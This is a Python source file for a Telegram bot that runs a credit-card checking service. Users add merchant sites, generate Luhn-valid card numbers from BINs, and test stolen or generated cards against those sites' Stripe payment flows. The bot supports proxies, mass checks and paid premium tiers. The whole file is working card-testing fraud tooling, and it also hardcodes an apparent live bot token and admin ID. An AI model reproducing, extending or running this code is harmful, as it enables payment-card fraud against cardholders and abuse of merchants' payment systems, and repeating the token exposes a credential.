#!/usr/bin/env python3
"""
Telegram Bot for Stripe Auth Checker
Handles multiple users, sites, and CC checking
"""

import json
import os
import time
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from pathlib import Path
import re

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
    from telegram.constants import ParseMode
except ImportError:
    print("Please install python-telegram-bot: pip install python-telegram-bot")
    exit(1)

from stripe_auth_checker import auth, parse_cc_string
from bin_lookup import get_card_info_from_cc, format_card_info_for_response

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8365550722:AAEOsc6eAA-lWNaPBK1oKBiXIhuD-imSL20"  # Replace with your bot token
ADMIN_CHAT_ID = 5671920054  # Replace with your admin chat ID
ADMIN_USERNAME = "@LEGEND_BL"  # Replace with your admin username

# File paths
BASE_DIR = Path(__file__).parent
USERS_FILE = BASE_DIR / "users.json"
SITES_FILE = BASE_DIR / "sites.json"
BINS_FILE = BASE_DIR / "bins.json"
USERS_FOLDER = BASE_DIR / "users"
GENS_FOLDER = BASE_DIR / "gens"

# Rate limiting
AUTH_COOLDOWN = 30  # seconds
GEN_COOLDOWN = 30  # seconds

# Lock for preventing multiple /auth commands from normal users simultaneously
auth_locks = {}  # {user_id: asyncio.Lock}
auth_lock_global = asyncio.Lock()  # Lock for accessing auth_locks dict

# Lock for preventing concurrent testing of the same BIN
bin_testing_locks = {}  # {bin_num: asyncio.Lock}
bin_test_results = {}  # {bin_num: {'status': 'success'/'failed', 'result': auth_result, 'time': iso_string}}
bin_lock_global = asyncio.Lock()  # Lock for accessing bin_testing_locks dict

# ==================== HELPER FUNCTIONS ====================

def load_json(file_path: Path, default: dict = None) -> dict:
    """Load JSON file, return default if doesn't exist"""
    if file_path.exists():
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default or {}
    return default or {}


def save_json(file_path: Path, data: dict):
    """Save data to JSON file"""
    file_path.parent.mkdir(parents=True, exist_ok=True)
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def get_user_data(user_id: int) -> dict:
    """Get user data from users.json"""
    users = load_json(USERS_FILE)
    return users.get(str(user_id), {})


def save_user_data(user_id: int, data: dict):
    """Save user data to users.json"""
    users = load_json(USERS_FILE)
    users[str(user_id)] = data
    save_json(USERS_FILE, users)


def is_premium(user_id: int) -> bool:
    """Check if user is premium"""
    user_data = get_user_data(user_id)
    if not user_data.get('premium'):
        return False
    expiry = user_data.get('premium_expiry')
    if not expiry:
        return False
    try:
        expiry_date = datetime.fromisoformat(expiry)
        return datetime.now() < expiry_date
    except:
        return False


def is_banned(user_id: int) -> bool:
    """Check if user is banned"""
    user_data = get_user_data(user_id)
    return user_data.get('banned', False)


def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id == ADMIN_CHAT_ID


def get_sites() -> dict:
    """Get all sites from sites.json"""
    return load_json(SITES_FILE)


def get_bins() -> dict:
    """Get all bins from bins.json"""
    return load_json(BINS_FILE)


def save_bins(bins: dict):
    """Save bins to bins.json"""
    with open(BINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(bins, f, indent=2, ensure_ascii=False)


def get_active_bins() -> List[str]:
    """Get all active bins (working bins)"""
    bins = get_bins()
    return [bin_num for bin_num in bins.keys()]


def add_bin(bin_num: str, checked_time: str = None):
    """Add a bin to bins.json"""
    bins = get_bins()
    if checked_time is None:
        checked_time = datetime.now().isoformat()
    bins[bin_num] = {
        'last_checked': checked_time,
        'added_at': datetime.now().isoformat()
    }
    save_bins(bins)


def update_bin_check_time(bin_num: str):
    """Update the last checked time for a bin"""
    bins = get_bins()
    if bin_num in bins:
        bins[bin_num]['last_checked'] = datetime.now().isoformat()
        save_bins(bins)


def remove_bin(bin_num: str):
    """Remove a bin from bins.json"""
    bins = get_bins()
    if bin_num in bins:
        del bins[bin_num]
        save_bins(bins)


def is_bin_recently_checked(bin_num: str, hours: int = 24) -> bool:
    """Check if bin was checked within the last N hours"""
    bins = get_bins()
    if bin_num not in bins:
        return False
    
    last_checked = bins[bin_num].get('last_checked')
    if not last_checked:
        return False
    
    try:
        last_time = datetime.fromisoformat(last_checked)
        time_diff = datetime.now() - last_time
        return time_diff.total_seconds() < (hours * 3600)
    except:
        return False


async def get_bin_lock(bin_num: str) -> asyncio.Lock:
    """Get or create a lock for a specific BIN"""
    async with bin_lock_global:
        if bin_num not in bin_testing_locks:
            bin_testing_locks[bin_num] = asyncio.Lock()
        return bin_testing_locks[bin_num]


def calculate_luhn_checksum(cc_base: str) -> int:
    """
    Calculate Luhn checksum for a CC number base (15 digits)
    Returns the check digit (0-9) that makes the full 16-digit number valid
    """
    # Reverse the number for easier processing
    digits = [int(d) for d in cc_base[::-1]]
    
    # Double every second digit (starting from index 1, which is second from right)
    for i in range(1, len(digits), 2):
        digits[i] *= 2
        # If result is two digits, add them together
        if digits[i] > 9:
            digits[i] = digits[i] // 10 + digits[i] % 10
    
    # Sum all digits
    total = sum(digits)
    
    # Calculate check digit to make sum divisible by 10
    checksum = (10 - (total % 10)) % 10
    return checksum


def generate_valid_cc(bin_prefix: str = "", existing_ccs: set = None) -> str:
    """
    Generate a valid 16-digit CC number using Luhn algorithm
    Ensures no duplicates if existing_ccs is provided
    Returns a valid 16-digit CC number
    """
    if existing_ccs is None:
        existing_ccs = set()
    
    import random
    
    max_attempts = 10000  # Prevent infinite loop
    attempts = 0
    
    while attempts < max_attempts:
        if bin_prefix:
            # Use BIN and generate rest
            remaining = 16 - len(bin_prefix)
            if remaining > 0:
                # Generate random digits for the rest (minus 1 for checksum)
                random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining - 1)])
                cc_base = bin_prefix + random_part
            else:
                # BIN is already 16 digits, use first 15 for base
                cc_base = bin_prefix[:15]
        else:
            # Generate 15 random digits
            cc_base = ''.join([str(random.randint(0, 9)) for _ in range(15)])
        
        # Calculate Luhn checksum
        checksum = calculate_luhn_checksum(cc_base)
        cc_digits = cc_base + str(checksum)
        
        # Check if already exists
        if cc_digits in existing_ccs:
            attempts += 1
            continue
        
        # Verify the full 16-digit number is valid (should always be true, but double-check)
        if len(cc_digits) == 16:
            # Verify using Luhn algorithm
            digits = [int(d) for d in cc_digits[::-1]]
            for i in range(1, len(digits), 2):
                digits[i] *= 2
                if digits[i] > 9:
                    digits[i] = digits[i] // 10 + digits[i] % 10
            total = sum(digits)
            if total % 10 == 0:
                return cc_digits
        
        attempts += 1
    
    # If we couldn't generate a valid CC after many attempts, raise error
    raise Exception("Failed to generate valid CC after maximum attempts")


async def test_bin_with_lock(bin_num: str, current_month: int, current_year: int) -> dict:
    """
    Test a BIN with locking to prevent concurrent tests of the same BIN
    Other users waiting for the same BIN will wait and use the cached result
    
    Returns: {'status': 'success'/'failed', 'result': auth_result_dict}
    """
    bin_lock = await get_bin_lock(bin_num)
    
    # First, check if result is already cached (from very recent test, within 60 seconds)
    # This avoids any locking overhead if we have a fresh result
    if bin_num in bin_test_results:
        result_data = bin_test_results[bin_num]
        result_time = datetime.fromisoformat(result_data.get('time', '2000-01-01'))
        time_diff = datetime.now() - result_time
        if time_diff.total_seconds() < 60:  # Cache valid for 60 seconds
            return result_data
    
    # Acquire lock (will wait if another user is currently testing this BIN)
    await bin_lock.acquire()
    try:
        # Double-check cache after acquiring lock (another request might have just finished)
        if bin_num in bin_test_results:
            result_data = bin_test_results[bin_num]
            result_time = datetime.fromisoformat(result_data.get('time', '2000-01-01'))
            time_diff = datetime.now() - result_time
            if time_diff.total_seconds() < 60:
                return result_data
        
        # Actually test the BIN
        import random
        
        # Test the CC with /auth on a random site
        sites = get_active_sites()
        if not sites:
            # No sites available
            test_result = {
                'status': 'failed',
                'result': {'success': False, 'message': 'No active sites available'},
                'time': datetime.now().isoformat()
            }
            bin_test_results[bin_num] = test_result
            return test_result
        
        test_domain = random.choice(sites)
        
        # Generate 1 test CC using the same function as /gen command
        # This ensures we use the exact same generation logic
        attempted_ccs = set()  # Track attempted CCs to avoid duplicates
        test_cc_digits = generate_valid_cc(bin_num, attempted_ccs)
        
        # Generate random expiry and CVV
        test_mm = f"{random.randint(current_month, 12):02d}" if current_month < 12 else f"{random.randint(1, 12):02d}"
        test_yyyy = str(random.randint(current_year, current_year + 10))
        test_cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        test_cc = f"{test_cc_digits}|{test_mm}|{test_yyyy}|{test_cvv}"
        
        # Run auth in thread pool to test the CC
        loop = asyncio.get_event_loop()
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=1) as executor:
            result = await loop.run_in_executor(executor, auth, test_domain, test_cc)
        
        # Store result
        test_result = {
            'status': 'success' if result.get('success') else 'failed',
            'result': result,
            'time': datetime.now().isoformat()
        }
        bin_test_results[bin_num] = test_result
        
        return test_result
    finally:
        bin_lock.release()


def save_sites(sites: dict):
    """Save sites to sites.json"""
    save_json(SITES_FILE, sites)


def site_exists(domain: str) -> bool:
    """Check if site already exists in sites.json"""
    sites = get_sites()
    return domain in sites


def add_site(domain: str, user_id: int, username: str) -> bool:
    """
    Add site to sites.json
    
    Returns:
        True if site was added, False if site already exists
    """
    sites = get_sites()
    
    # Check if site already exists
    if domain in sites:
        return False
    
    sites[domain] = {
        'added_by': user_id,
        'added_by_username': username,
        'added_at': datetime.now().isoformat(),
        'active': True
    }
    save_sites(sites)
    return True


def remove_site(domain: str):
    """Remove site from sites.json"""
    sites = get_sites()
    if domain in sites:
        del sites[domain]
        save_sites(sites)


def get_active_sites() -> List[str]:
    """Get list of active sites"""
    sites = get_sites()
    return [domain for domain, data in sites.items() if data.get('active', True)]


def increment_user_checks(user_id: int):
    """Increment user's total checks"""
    user_data = get_user_data(user_id)
    user_data['total_checks'] = user_data.get('total_checks', 0) + 1
    save_user_data(user_id, user_data)


def increment_user_sites(user_id: int):
    """Increment user's total sites added"""
    user_data = get_user_data(user_id)
    user_data['total_sites'] = user_data.get('total_sites', 0) + 1
    save_user_data(user_id, user_data)


def get_user_sites(user_id: int) -> List[str]:
    """Get sites added by user"""
    sites = get_sites()
    return [domain for domain, data in sites.items() if data.get('added_by') == user_id]


def is_user_checking(user_id: int) -> bool:
    """Check if user has files in their folder (checking in progress)"""
    user_folder = USERS_FOLDER / str(user_id)
    if not user_folder.exists():
        return False
    files = list(user_folder.glob("*"))
    return len(files) > 0


def get_user_folder(user_id: int) -> Path:
    """Get user's folder path"""
    folder = USERS_FOLDER / str(user_id)
    folder.mkdir(parents=True, exist_ok=True)
    return folder


def cleanup_user_folder(user_id: int):
    """Delete all files from user folder"""
    user_folder = USERS_FOLDER / str(user_id)
    if user_folder.exists():
        for file in user_folder.glob("*"):
            file.unlink()


def validate_cc_format(cc_string: str) -> bool:
    """Validate CC format (only 4 formats allowed)"""
    # Extract digits only
    digits = ''.join(filter(str.isdigit, cc_string))
    
    # Check if it matches one of the 4 formats
    # Format 1: cc|mm|yyyy|cvv (23 or 25 digits)
    # Format 2: cc|mm|yy|cvv (21 or 23 digits)
    # Format 3: cc|mm|yyyy|cvvv (26 digits)
    # Format 4: cc|mm|yy|cvvv (24 digits)
    
    # Check pipe-separated format
    if '|' in cc_string:
        parts = cc_string.split('|')
        if len(parts) == 4:
            cc, mm, year, cvv = parts
            # Validate lengths
            if len(cc) == 16 and len(mm) == 2 and len(cvv) in [3, 4]:
                if len(year) == 4 or len(year) == 2:
                    return True
    
    return False


def parse_proxy_from_text(text: str) -> Tuple[str, Optional[str]]:
    """
    Parse proxy from text, return (cc_string, proxy)
    Supports formats:
    - ip:port
    - ip:port:user:pass
    """
    parts = text.split()
    if len(parts) >= 2:
        # Check if last part looks like a proxy (contains : or .)
        last_part = parts[-1]
        if ':' in last_part or '.' in last_part:
            # Count colons to determine format
            colon_count = last_part.count(':')
            # ip:port (1 colon) or ip:port:user:pass (3 colons)
            if colon_count == 1 or colon_count == 3:
                cc_string = ' '.join(parts[:-1])
                proxy = last_part
                return cc_string, proxy
    return text, None


def format_proxy_for_requests(proxy: str) -> str:
    """
    Format proxy string for requests library
    Converts:
    - ip:port -> ip:port
    - ip:port:user:pass -> user:pass@ip:port
    """
    if not proxy:
        return None
    
    parts = proxy.split(':')
    if len(parts) == 2:
        # ip:port format
        return proxy
    elif len(parts) == 4:
        # ip:port:user:pass format -> convert to user:pass@ip:port
        ip, port, user, password = parts
        return f"{user}:{password}@{ip}:{port}"
    else:
        # Unknown format, return as-is
        return proxy


async def test_proxy_connection(proxy: str) -> bool:
    """
    Test if proxy connection works
    Returns True if proxy works, False otherwise
    """
    try:
        import requests
        from concurrent.futures import ThreadPoolExecutor
        
        # Format proxy for requests
        formatted_proxy = format_proxy_for_requests(proxy)
        if not formatted_proxy:
            return False
        
        proxies = {
            'http': f'http://{formatted_proxy}',
            'https': f'http://{formatted_proxy}'
        }
        
        # Test proxy by making a request to a reliable endpoint
        # Try multiple endpoints in case one is blocked
        test_urls = [
            'https://www.google.com',
            'https://httpbin.org/ip',
            'http://httpbin.org/ip'
        ]
        
        # Use a short timeout to avoid hanging
        def test_connection():
            for url in test_urls:
                try:
                    response = requests.get(
                        url,
                        proxies=proxies,
                        timeout=8,
                        allow_redirects=True
                    )
                    # If we get any response (even 3xx, 4xx, 5xx), proxy is working
                    if response.status_code:
                        return True
                except requests.exceptions.ProxyError:
                    # Proxy error means proxy is dead
                    return False
                except requests.exceptions.ConnectTimeout:
                    # Timeout means proxy is likely dead
                    continue
                except requests.exceptions.Timeout:
                    # Timeout means proxy is likely dead
                    continue
                except Exception:
                    # Other errors, try next URL
                    continue
            return False
        
        # Run in thread pool to avoid blocking
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=1) as executor:
            result = await loop.run_in_executor(executor, test_connection)
            return result
            
    except Exception:
        return False


async def animate_dots(message, text_base: str, max_dots: int = 3):
    """Animate dots in message"""
    for i in range(max_dots + 1):
        dots = '.' * i
        try:
            await message.edit_text(f"{text_base}{dots}")
            await asyncio.sleep(0.5)
        except:
            pass


def check_group_access(update: Update, user_id: int) -> bool:
    """Check if user/group has access to use bot"""
    # Check if in group
    if update.effective_chat.type in ['group', 'supergroup']:
        groups_file = BASE_DIR / "groups.json"
        groups = load_json(groups_file)
        if str(update.effective_chat.id) not in groups and not is_admin(user_id):
            return False
    return True


def get_reply_id(update: Update) -> Optional[int]:
    """Get reply message ID for groups"""
    if update.effective_chat.type in ['group', 'supergroup']:
        return update.message.message_id
    return None


# ==================== COMMAND HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_id = user.id
    
    # Check group access
    if not check_group_access(update, user_id):
        return
    
    if is_banned(user_id):
        await update.message.reply_text("You are banned from using this bot.")
        return
    
    # Register user
    user_data = get_user_data(user_id)
    if not user_data:
        user_data = {
            'user_id': user_id,
            'username': user.username or 'N/A',
            'first_name': user.first_name or 'N/A',
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0,
            'total_sites': 0,
            'last_active': datetime.now().isoformat(),
            'premium': False,
            'banned': False
        }
        save_user_data(user_id, user_data)
        await update.message.reply_text(
            "✅ You are registered!\n\n"
            "📋 Example usage:\n"
            "• /site example.com - Add a site\n"
            "• /auth 4111111111111111|12|2025|123 - Check a card\n"
            "• /sauth example.com 4111111111111111|12|2025|123 - Check on specific site\n"
            "• /gen - Generate 10 credit cards\n"
            "• /gen100 - Generate 100 credit cards\n"
            "• /gen1000 - Generate 1000 credit cards\n"
            "• /profile - View your profile\n"
            "• /mysites - View your sites\n"
            "• /help - See all commands\n"
        )
    else:
        # Update last active
        user_data['last_active'] = datetime.now().isoformat()
        save_user_data(user_id, user_data)
        
        if is_admin(user_id):
            # Show admin stats
            users = load_json(USERS_FILE)
            total_users = len(users)
            active_users = sum(1 for u in users.values() 
                            if datetime.fromisoformat(u.get('last_active', '2000-01-01')) > datetime.now() - timedelta(hours=48))
            
            # Top 3 by checks
            top_checks = sorted(users.values(), key=lambda x: x.get('total_checks', 0), reverse=True)[:3]
            # Top 3 by sites
            top_sites = sorted(users.values(), key=lambda x: x.get('total_sites', 0), reverse=True)[:3]
            
            text = f"👑 Admin Panel\n\n"
            text += f"📊 Statistics:\n"
            text += f"• Total Users: {total_users}\n"
            text += f"• Active Users (48h): {active_users}\n\n"
            text += f"🏆 Top 3 by Checks:\n"
            for i, u in enumerate(top_checks, 1):
                text += f"{i}. @{u.get('username', 'N/A')} - {u.get('total_checks', 0)} checks\n"
            text += f"\n🏆 Top 3 by Sites Added:\n"
            for i, u in enumerate(top_sites, 1):
                text += f"{i}. @{u.get('username', 'N/A')} - {u.get('total_sites', 0)} sites\n"
            
            await update.message.reply_text(text)
        else:
            await update.message.reply_text(
                "Welcome back!\n\n"
                "📋 Commands:\n"
                "• /site domain - Add a site\n"
                "• /auth cc|mm|yyyy|cvv - Check a card\n"
                "• /sauth domain cc|mm|yyyy|cvv - Check on specific site\n"
                "• /gen - Generate 10 credit cards\n"
                "• /gen100 - Generate 100 credit cards\n"
                "• /gen1000 - Generate 1000 credit cards\n"
                "• /profile - View your profile\n"
                "• /mysites - View your sites\n"
                "• /help - See all commands\n"
            )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    user = update.effective_user
    user_id = user.id
    
    if not check_group_access(update, user_id):
        return
    
    if is_banned(user_id):
        return
    
    # User commands
    help_text = "📋 **User Commands:**\n\n"
    help_text += "• `/start` - Register and view welcome message\n"
    help_text += "• `/help` - Show this help message\n"
    help_text += "• `/profile` - View your profile and statistics\n"
    help_text += "• `/site domain [proxy]` - Add a site to the checker\n"
    help_text += "• `/mysites` - View all sites you've added\n"
    help_text += "• `/msites [proxy]` - Mass add sites (reply to sites.txt file)\n"
    help_text += "• `/auth cc|mm|yyyy|cvv [proxy]` - Check a card on a random site (30s cooldown for normal users)\n"
    help_text += "• `/sauth domain cc|mm|yyyy|cvv [proxy]` - Check a card on a specific site\n"
    help_text += "• `/mauth [proxy]` - Mass check cards (reply to .txt file, premium only)\n"
    help_text += "• `/mcancel` - Cancel ongoing mass check\n"
    help_text += "• `/gen [BIN|mm|yyyy|cvv]` - Generate 10 credit cards (uses random BIN if not provided, 30s cooldown)\n"
    help_text += "• `/gen100 [BIN|mm|yyyy|cvv]` - Generate 100 credit cards (max 1000)\n"
    help_text += "• `/gen1000 [BIN|mm|yyyy|cvv]` - Generate 1000 credit cards\n"
    help_text += "\n**CC Formats:** `cc|mm|yyyy|cvv`, `cc|mm|yy|cvv`, `cc|mm|yyyy|cvvv`, `cc|mm|yy|cvvv`\n"
    help_text += "**Proxy formats:** `ip:port` or `ip:port:user:pass`\n"
    
    # Admin commands (if user is admin)
    if is_admin(user_id):
        help_text += "\n\n👑 **Admin Commands:**\n\n"
        help_text += "• `/premium {userid} {days}` - Grant premium status to a user\n"
        help_text += "• `/ban {userid}` - Ban a user from using the bot\n"
        help_text += "• `/unban {userid}` - Unban a user\n"
        help_text += "• `/premiumusers` - List all premium users\n"
        help_text += "• `/users` - View user statistics (total users, active users, top users)\n"
        help_text += "• `/addgrp {groupId}` - Add a group to allowed list\n"
        help_text += "• `/rmgrp {groupId}` - Remove a group from allowed list\n"
        help_text += "• `/groups` - List all allowed groups\n"
        help_text += "• `/tsites` - Show total number of active sites\n"
        help_text += "• `/dsites` - Download all active sites as .txt file\n"
        help_text += "• `/addbin {bin}` - Add a working BIN (6-14 digits, tests before adding)\n"
    
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)


async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /site command"""
    user = update.effective_user
    user_id = user.id
    
    if not check_group_access(update, user_id):
        return
    
    if is_banned(user_id):
        return
    
    reply_to = get_reply_id(update)
    
    if not context.args:
        await update.message.reply_text("Usage: /site domain [proxy]\n\nProxy formats:\n• ip:port\n• ip:port:user:pass")
        return
    
    # Parse domain and proxy
    text = ' '.join(context.args)
    parts = text.split()
    domain = parts[0]
    proxy = None
    
    # Check if proxy is provided (last part contains : or .)
    if len(parts) > 1:
        last_part = parts[-1]
        if ':' in last_part or '.' in last_part:
            # Count colons to determine format
            colon_count = last_part.count(':')
            # ip:port (1 colon) or ip:port:user:pass (3 colons)
            if colon_count == 1 or colon_count == 3:
                proxy = last_part
    
    # Test proxy connection if provided
    if proxy:
        test_msg = await update.message.reply_text("🔍 Testing proxy connection...", reply_to_message_id=reply_to)
        proxy_works = await test_proxy_connection(proxy)
        await test_msg.delete()  # Delete test message
        
        if not proxy_works:
            await update.message.reply_text("❌ Proxy Dead", reply_to_message_id=reply_to)
            return
    
    # Test domain with test CC
    test_cc = "5444224035733160|02|2029|832"
    
    msg = await update.message.reply_text("Adding site...", reply_to_message_id=reply_to)
    await animate_dots(msg, "Adding site", 3)
    
    # Check if site already exists
    if site_exists(domain):
        await msg.edit_text(f"⚠️ Site already exists: {domain}")
        return
    
    # Run auth in thread pool to avoid blocking other users
    loop = asyncio.get_event_loop()
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=10) as executor:
        result = await loop.run_in_executor(executor, auth, domain, test_cc, proxy)
    
    # Check if site is good (has pm_id and response)
    if result.get('pm_id') and (result.get('raw_response') or result.get('raw_response_json')):
        success = add_site(domain, user_id, user.username or 'N/A')
        if success:
            increment_user_sites(user_id)
            await msg.edit_text("✅ Site added successfully!")
        else:
            await msg.edit_text(f"⚠️ Site already exists: {domain}")
    else:
        await msg.edit_text("❌ Couldn't add site!")


async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /profile command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    user_data = get_user_data(user_id)
    user_sites = get_user_sites(user_id)
    
    text = f"👤 Profile\n\n"
    text += f"🆔 User ID: {user_id}\n"
    text += f"👤 Name: {user_data.get('first_name', 'N/A')}\n"
    text += f"📝 Username: @{user_data.get('username', 'N/A')}\n"
    text += f"📊 Total Checks: {user_data.get('total_checks', 0)}\n"
    text += f"🌐 Sites Added: {len(user_sites)}\n"
    text += f"⭐ Premium: {'Yes' if is_premium(user_id) else 'No'}\n"
    text += f"📅 Registered: {user_data.get('registered_at', 'N/A')[:10]}"
    
    await update.message.reply_text(text)


async def mysites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mysites command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    user_sites = get_user_sites(user_id)
    
    if not user_sites:
        await update.message.reply_text("You haven't added any sites yet.")
        return
    
    sites_text = '\n'.join(user_sites)
    
    if len(sites_text) > 4000:
        msg = await update.message.reply_text("You have too many sites, packing them...")
        await animate_dots(msg, "You have too many sites, packing them", 3)
        
        user_folder = get_user_folder(user_id)
        sites_file = user_folder / "sites.txt"
        with open(sites_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(user_sites))
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(sites_file, 'rb'),
            filename="sites.txt"
        )
        await msg.delete()
    else:
        await update.message.reply_text(f"Your sites:\n\n{sites_text}")


async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /auth command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /auth cc|mm|yyyy|cvv [proxy]\n\nProxy formats:\n• ip:port\n• ip:port:user:pass")
        return
    
    # Get user data first (needed for cooldown check and later update)
    user_data = get_user_data(user_id)
    
    # For normal users: prevent multiple simultaneous /auth commands
    # Admin and premium users can run multiple commands simultaneously
    user_lock = None
    if not is_admin(user_id) and not is_premium(user_id):
        # Get or create lock for this user
        async with auth_lock_global:
            if user_id not in auth_locks:
                auth_locks[user_id] = asyncio.Lock()
            user_lock = auth_locks[user_id]
        
        # Try to acquire lock (non-blocking check)
        if user_lock.locked():
            await update.message.reply_text(
                f"⏳ Please wait for your previous /auth command to complete.\n\n"
                f"💎 Want to remove cooldown and run multiple checks? Purchase premium subscription from {ADMIN_USERNAME}"
            )
            return
        
        # Acquire lock for this command
        await user_lock.acquire()
    
    try:
        # Check cooldown (only for normal users, not admin or premium)
        if not is_admin(user_id) and not is_premium(user_id):
            last_auth = user_data.get('last_auth_time')
            if last_auth:
                try:
                    last_time = datetime.fromisoformat(last_auth)
                    time_diff = datetime.now() - last_time
                    if time_diff.total_seconds() < AUTH_COOLDOWN:
                        remaining = AUTH_COOLDOWN - int(time_diff.total_seconds())
                        await update.message.reply_text(
                            f"⏳ Please wait {remaining} seconds before using /auth again.\n\n"
                            f"💎 Want to remove cooldown? Purchase premium subscription from {ADMIN_USERNAME}"
                        )
                        return
                except:
                    pass
        
        # Parse CC and proxy
        text = ' '.join(context.args)
        cc_string, proxy = parse_proxy_from_text(text)
        
        if not validate_cc_format(cc_string):
            await update.message.reply_text("❌ Invalid CC format. Please use format: cc|mm|yyyy|cvv or cc|mm|yy|cvv\n\nExample: /auth 4111111111111111|12|2025|123")
            return
        
        # Test proxy connection if provided
        if proxy:
            test_msg = await update.message.reply_text("🔍 Testing proxy connection...")
            proxy_works = await test_proxy_connection(proxy)
            await test_msg.delete()  # Delete test message
            
            if not proxy_works:
                await update.message.reply_text("❌ Proxy Dead")
                return
        
        # Get active sites
        sites = get_active_sites()
        if not sites:
            await update.message.reply_text("❌ No active sites available. Please add sites first.")
            return
        
        # Try auth on random site
        import random
        domain = random.choice(sites)
        
        msg = await update.message.reply_text(f"Checking...")
        
        # Track start time for response time calculation
        start_time = time.time()
        
        # Run auth in thread pool to avoid blocking other users
        try:
            loop = asyncio.get_event_loop()
            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=10) as executor:
                result = await loop.run_in_executor(executor, auth, domain, cc_string, proxy)
            
            # Calculate response time
            response_time = time.time() - start_time
        except Exception as e:
            # Calculate response time even on error
            response_time = time.time() - start_time
            error_msg = str(e)
            # Check if it's a format error - don't remove site for format errors
            if 'Invalid CC format' in error_msg or 'Cannot parse CC string' in error_msg or 'Too few digits' in error_msg or 'Unknown format code' in error_msg:
                await msg.edit_text(f"❌ Invalid CC format: {error_msg}\n\nPlease use format: cc|mm|yyyy|cvv or cc|mm|yy|cvv\n\nExample: /auth 4111111111111111|12|2025|123")
            else:
                await msg.edit_text(f"❌ Error: {error_msg}")
            return
        
        # Check if result indicates a validation error (BEFORE checking site removal)
        error_message = result.get('message', '')
        error_status = result.get('status', '')
        
        # Check for validation errors that shouldn't trigger site removal
        validation_errors = [
            'Invalid CC format',
            'Unknown format code',
            'Incorrect card number',
            'Expired card',
            'Invalid expiry date'
        ]
        
        if any(err in error_message for err in validation_errors):
            # Format validation errors nicely
            if 'Invalid CC format' in error_message or 'Unknown format code' in error_message:
                await msg.edit_text(f"❌ Invalid CC format: {error_message}\n\nPlease use format: cc|mm|yyyy|cvv or cc|mm|yy|cvv\n\nExample: /auth 4111111111111111|12|2025|123")
                return
            else:
                # Other validation errors (incorrect card number, expired card)
                response_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌\n\n"
                response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
                response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
                response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_message}"
                
                # Get card info (BIN lookup) even for declined cards
                try:
                    card_info = get_card_info_from_cc(cc_string)
                    card_info_text = format_card_info_for_response(card_info)
                    response_text += card_info_text
                except Exception as e:
                    # If BIN lookup fails, continue without card info
                    pass
                
                # Add response time
                response_text += f"\n\nResponse Time → {response_time:.2f}s"
                
                await msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
                return
        
        # Update last auth time
        user_data['last_auth_time'] = datetime.now().isoformat()
        save_user_data(user_id, user_data)
        
        # Increment checks
        increment_user_checks(user_id)
        
        # Format response based on success
        # Get actual message from response (should always be present from auth function)
        response_message = result.get('message', 'No response message')
        
        if result.get('success'):
            # APPROVED format
            response_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅\n\n"
            response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
            response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
            response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}"
        else:
            # DECLINED format
            response_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌\n\n"
            response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
            response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
            response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}"
        
        # Get card info (BIN lookup)
        try:
            card_info = get_card_info_from_cc(cc_string)
            card_info_text = format_card_info_for_response(card_info)
            response_text += card_info_text
        except Exception as e:
            # If BIN lookup fails, continue without card info
            pass
        
        # Add response time
        response_text += f"\n\nResponse Time → {response_time:.2f}s"
        
        # Check if site is broken (missing pm_id or response means site is not working)
        # Card validation failures (declined, incorrect number) are normal - site is still good
        # Format errors are already handled above, so we won't reach here if there's a format error
        has_pm_id = result.get('pm_id') is not None
        has_response = result.get('raw_response') or result.get('raw_response_json')
        
        # Only remove site if pm_id or response is missing (site is broken)
        # This won't trigger for format errors since we return early above
        if not has_pm_id or not has_response:
            # Site is broken - remove it
            remove_site(domain)
            response_text += "\n\n⚠️ Site removed (no longer working)"
        
        await msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
